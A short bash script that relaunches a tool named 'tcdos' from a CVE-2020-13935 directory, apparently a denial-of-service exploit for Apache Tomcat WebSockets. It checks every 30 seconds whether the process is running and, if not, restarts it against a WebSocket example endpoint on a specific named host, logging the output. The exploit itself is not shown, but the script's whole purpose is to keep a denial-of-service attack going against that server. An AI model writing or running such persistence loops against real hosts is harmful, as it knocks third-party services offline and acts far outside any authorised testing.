#! /bin/bash
while true 
do
    node_procnum=`ps -ef|grep "tcdos"|grep -v grep|wc -l`
	
    if [ $node_procnum -eq 0 ] 
    then
        echo "start tcdos-script..."
        /root/CVE-2020-13935/tcdos ws://t1.tedet.cn/examples/websocket/echoStreamAnnotation >> ./log.log 2>&1
    fi
    sleep 30 #每30秒检查一轮
done
